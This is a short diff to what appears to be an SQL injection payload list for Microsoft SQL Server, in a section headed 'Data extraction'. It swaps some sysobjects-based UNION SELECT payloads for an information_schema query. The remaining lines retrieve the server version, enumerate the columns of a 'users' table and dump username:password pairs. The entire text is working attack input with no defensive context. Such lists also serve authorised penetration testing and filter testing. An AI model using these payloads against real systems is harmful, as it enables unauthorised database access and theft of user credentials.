@@ -15,9 +15,6 @@
 
 # --- Data extraction ---
 ' UNION SELECT @@version--
-' UNION SELECT db_name()--
-' UNION SELECT system_user--
-' UNION SELECT name FROM sysobjects WHERE xtype='U'--
-' UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U'--
+' UNION SELECT TOP 1 table_name FROM information_schema.tables--
 ' UNION SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'--
 ' UNION SELECT TOP 1 username+':'+password FROM users--
